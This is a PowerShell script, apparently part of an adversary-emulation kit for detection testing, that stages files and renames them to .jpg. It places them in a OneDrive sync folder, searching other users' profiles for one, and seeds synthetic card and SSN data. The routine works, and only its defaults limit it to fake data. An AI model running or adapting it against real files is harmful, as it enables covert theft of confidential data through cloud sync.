# ============================================================================
# Stage5-Exfiltration.ps1
# MITRE: T1074.001 Data Staged | T1036.008 Masquerade File Type (rename to .jpg)
#        T1567.002 Exfiltration to Cloud Storage (move into a cloud-sync folder)
# ----------------------------------------------------------------------------
# Benign. Operates only on SYNTHETIC files (test PANs / fake passport patterns).
# Collects the "sensitive" files from C:\Confidential (self-seeds from the
# staging copy if that folder is empty, so it works when run standalone on
# Target 2), copies each one renamed as <name>_exfil.jpg to disguise the type,
# then moves the copies into the user's OneDrive folder (falling back to
# %LOCALAPPDATA%\Temp\OneDrive if OneDrive is not configured).
#
# Maps to guide 10.1 / 10.3 (data context, data-theft-to-root-cause, SC-10) and
# to the RSA talk track (staging to a cloud-sync folder). Cleanup-Target2.ps1
# removes both the staged copies and the exfil copies.
# ============================================================================
[CmdletBinding()]
param(
    [string]$SourceDir,
    [string]$DestDir
)

New-Item -ItemType Directory -Force -Path 'C:\Users\Public\staging' -ErrorAction SilentlyContinue | Out-Null
$stage5TranscriptStarted = $false
try {
    Start-Transcript -Path 'C:\Users\Public\staging\stage5-log.txt' -Append -Force -ErrorAction SilentlyContinue | Out-Null
    $stage5TranscriptStarted = $true
} catch { }

try {

if (-not (Get-Command Write-Step -ErrorAction SilentlyContinue)) {
    function Write-Step($m){ Write-Host "[$((Get-Date).ToString('yyyy-MM-dd HH:mm:ss.fff'))] $m" -ForegroundColor Yellow }
    function Write-Stage($t){ Write-Host "`n==== $t  START $((Get-Date).ToString('yyyy-MM-dd HH:mm:ss.fff'))" -ForegroundColor Cyan }
    function Write-StageEnd($t){ Write-Host "==== $t  END   $((Get-Date).ToString('yyyy-MM-dd HH:mm:ss.fff'))`n" -ForegroundColor Cyan }
    function Write-Info($m){ Write-Host "        $m" -ForegroundColor DarkGray }
}
$conf       = if ($SourceDir) { $SourceDir } elseif ($CBXEmu) { $CBXEmu.ConfidentialDir } else { 'C:\Confidential' }
$stagingDir = if ($CBXEmu) { $CBXEmu.StagingDir } else { 'C:\Users\Public\staging' }
$suffix     = if ($CBXEmu) { $CBXEmu.ExfilSuffix } else { '_exfil' }
$fakeExt    = if ($CBXEmu) { $CBXEmu.ExfilExt }    else { '.jpg' }

Write-Stage "STAGE 5 - EXFILTRATION (staging + masquerade + cloud-sync)"

# --- self-seed the source folder if empty (standalone run on Target 2) ---
if (-not (Test-Path $conf)) { New-Item -ItemType Directory -Force -Path $conf | Out-Null }
if (-not (Get-ChildItem -Path $conf -File -ErrorAction SilentlyContinue)) {
    # -Include requires a trailing \* on the path to work in PS 5.1; use Where-Object instead.
    # Exclude stage log files (*-log.txt) that live in the staging root alongside data files.
    $seed = Get-ChildItem -Path $stagingDir -File -ErrorAction SilentlyContinue |
        Where-Object { $_.Extension -in @('.csv','.txt','.xlsx','.docx','.pptx','.pdf') -and
                       $_.Name -notlike '*-log.txt' }
    if ($seed) {
        $seed | Copy-Item -Destination $conf -Force
        Write-Info "seeded $conf from staging"
    } else {
        # No staging data files - generate synthetic PII directly so the script is
        # self-contained on Target 2 regardless of what the staging kit contains.
        # Array-join syntax avoids here-string line-ending sensitivity (LF vs CRLF).
        # Five file types (csv, txt, xlsx, docx, pdf) enrich the T1036.008 story
        # - five _exfil.jpg files in the cloud-sync folder instead of two.
        Write-Info "No staging data files found - generating synthetic source data in $conf"
        @('RecordID,Name,CardNumber,Expiry,CVV',
          '1,John Smith,4111111111111111,12/26,123',
          '2,Jane Doe,5500005555555555,08/27,456',
          '3,Robert Johnson,378282246310005,03/25,7890',
          '4,Emily Davis,6011111111111117,11/28,321',
          '5,Michael Brown,3566002020360505,06/26,654') -join "`r`n" |
            Set-Content (Join-Path $conf 'financial_records.csv') -Encoding UTF8
        @('PASSPORT RECORD - SYNTHETIC TEST DATA',
          '======================================',
          'Surname: SMITH',
          'Given Names: JOHN WILLIAM',
          'Nationality: USA',
          'Date of Birth: 15 JAN 1980',
          'Sex: M',
          'Place of Birth: NEW YORK',
          'Issue Date: 01 MAR 2020',
          'Expiry Date: 28 FEB 2030',
          'Passport No: P12345678') -join "`r`n" |
            Set-Content (Join-Path $conf 'passport_records.txt') -Encoding UTF8
        @('EmployeeID,Name,Department,Title,Salary',
          '1001,John Smith,Engineering,Sr. Engineer,95000',
          '1002,Jane Doe,Marketing,Director,112000',
          '1003,Robert Johnson,Finance,Controller,102000',
          '1004,Emily Davis,HR,Manager,88500',
          '1005,Michael Brown,Sales,VP,135000') -join "`r`n" |
            Set-Content (Join-Path $conf 'payroll_q4.xlsx') -Encoding UTF8
        @('EMPLOYEE RECORDS - SYNTHETIC TEST DATA',
          '========================================',
          'Name: John Smith      | Dept: Engineering | SSN: 123-45-6789 (SYNTHETIC)',
          'Name: Jane Doe        | Dept: Marketing   | SSN: 987-65-4321 (SYNTHETIC)',
          'Name: Robert Johnson  | Dept: Finance     | SSN: 456-78-9012 (SYNTHETIC)',
          'Name: Emily Davis     | Dept: HR          | SSN: 321-54-0987 (SYNTHETIC)',
          'Name: Michael Brown   | Dept: Sales       | SSN: 789-01-2345 (SYNTHETIC)') -join "`r`n" |
            Set-Content (Join-Path $conf 'employee_records.docx') -Encoding UTF8
        @('%PDF-1.4',
          '% AUTHORIZED CBX TELEMETRY TEST - SYNTHETIC DATA',
          '1 0 obj',
          '<< /Type /Catalog /Pages 2 0 R >>',
          'endobj',
          '2 0 obj',
          '<< /Type /Pages /Count 0 >>',
          'endobj',
          '% NDA_2026_Confidential - Synthetic contract record',
          '%%EOF') -join "`r`n" |
            Set-Content (Join-Path $conf 'contracts_2026.pdf') -Encoding UTF8
        Write-Info "Generated 5 synthetic source files (csv, txt, xlsx, docx, pdf)"
    }
}

# --- resolve the cloud-sync destination ---
if (-not $DestDir) {
    $DestDir = $env:OneDriveCommercial
    if (-not $DestDir -or -not (Test-Path $DestDir)) { $DestDir = $env:OneDrive }
    if (-not $DestDir -or -not (Test-Path $DestDir)) {
        # Current user has no OneDrive configured.
        # Scan all user profiles for any OneDrive folder so the script works regardless
        # of which account WMI runs under on the remote target (e.g. kirt.chung vs arthur.anchor).
        # OneDrive's file-system watcher picks up files written by any admin-rights process,
        # so dropping files into another user's synced folder still triggers T1567.002.
        $foundOD = Get-ChildItem 'C:\Users' -Directory -ErrorAction SilentlyContinue |
            ForEach-Object { Get-ChildItem $_.FullName -Directory -ErrorAction SilentlyContinue } |
            Where-Object { $_.Name -like 'OneDrive*' } |
            Select-Object -First 1
        if ($foundOD) {
            $DestDir = $foundOD.FullName
            Write-Info "Current user has no OneDrive - using $DestDir"
        }
    }
    if (-not $DestDir -or -not (Test-Path $DestDir)) {
        $DestDir = Join-Path $env:LOCALAPPDATA 'Temp\OneDrive'
        Write-Info "OneDrive not configured on this machine - using fallback $DestDir"
    }
}
if (-not (Test-Path $DestDir)) { New-Item -ItemType Directory -Force -Path $DestDir | Out-Null }
Write-Step "Exfil destination: $DestDir"

# --- stage, masquerade, move ---
$files = Get-ChildItem -Path $conf -File -ErrorAction SilentlyContinue
if (-not $files) { Write-Step "No source files in $conf - nothing to do."; Write-StageEnd "STAGE 5 - EXFILTRATION"; return }

foreach ($f in $files) {
    $base       = [System.IO.Path]::GetFileNameWithoutExtension($f.Name)
    $exfilName  = "$base$suffix$fakeExt"                       # e.g. passport_exfil.jpg
    $exfilPath  = Join-Path $DestDir $exfilName
    Copy-Item -Path $f.FullName -Destination $exfilPath -Force # copy + rename = type masquerade
    Write-Info "staged $($f.Name)  ->  $exfilName"
}
Write-Step "Copied $($files.Count) synthetic file(s) into the cloud-sync folder as .jpg (T1036.008 / T1567.002)"

Write-StageEnd "STAGE 5 - EXFILTRATION"

} finally {
    if ($stage5TranscriptStarted) { Stop-Transcript -ErrorAction SilentlyContinue | Out-Null }
}
